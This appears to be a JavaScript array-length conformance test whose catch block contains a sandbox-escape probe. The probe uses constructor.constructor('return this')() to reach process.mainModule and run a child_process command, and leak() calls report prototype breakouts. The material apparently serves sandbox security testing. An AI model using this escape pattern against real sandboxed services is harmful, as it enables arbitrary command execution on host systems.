try {
    var x = [];
    if (x.length !== 0) {
        $ERROR('#1: x = []; x.length === 0. Actual: ' + x.length);
    }
    x[0] = 1;
    if (x.length !== 1) {
        $ERROR('#2: x = []; x[1] = 1; x.length === 1. Actual: ' + x.length);
    }
    x[1] = 1;
    if (x.length !== 2) {
        $ERROR('#3: x = []; x[0] = 1; x[1] = 1; x.length === 2. Actual: ' + x.length);
    }
    x[2147483648] = 1;
    if (x.length !== 2147483649) {
        $ERROR('#4: x = []; x[0] = 1; x[1] = 1; x[2147483648] = 1; x.length === 2147483649. Actual: ' + x.length);
    }
    x[4294967294] = 1;
    if (x.length !== 4294967295) {
        $ERROR('#5: x = []; x[0] = 1; x[1] = 1; x[2147483648] = 1; x[42949672954] = 1; x.length === 4294967295. Actual: ' + x.length);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}